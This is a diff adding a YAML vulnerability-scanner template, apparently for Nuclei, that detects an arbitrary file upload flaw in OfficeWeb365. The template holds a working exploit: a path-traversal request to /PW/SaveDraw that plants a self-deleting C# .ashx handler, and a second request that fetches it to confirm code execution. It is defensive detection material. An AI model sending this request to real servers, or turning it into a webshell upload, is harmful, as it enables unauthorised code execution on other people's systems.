@@ -1,0 +1,50 @@
+id: officeweb365-file-upload
+
+info:
+  name: OfficeWeb365任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: OfficeWeb365任意文件上传漏洞
+  tags: OfficeWeb365
+
+variables:
+  randfilename: '{{randstr_2}}'
+  filecontent: '{{randstr_1}}'
+  filehash: '{{md5("{{filecontent}}")}}'
+  
+
+http:
+  - raw:
+      - |
+        GET /PW/SaveDraw?path=../../Content/img&idx={{randfilename}}.ashx HTTP/1.1
+        Host: {{Hostname}}
+
+        data:image/png;base64,{{filehash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
+        {
+        public void ProcessRequest(System.Web.HttpContext context)
+        {
+        System.Web.HttpResponse response = context.Response;
+        response.Write("{{filecontent}}");
+        
+        string filePath = context.Server.MapPath("/") + context.Request.Path;
+        if (System.IO.File.Exists(filePath))
+        {
+            System.IO.File.Delete(filePath);
+        }
+        }
+        public bool IsReusable
+        {
+        get { return false; }
+        }
+        }///---
+      
+      - |
+        GET /Content/img/UserDraw/drawPW{{randfilename}}.ashx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"ok")
+          - status_code_2 == 200 && contains(body_2,"{{filecontent}}")
+        condition: and
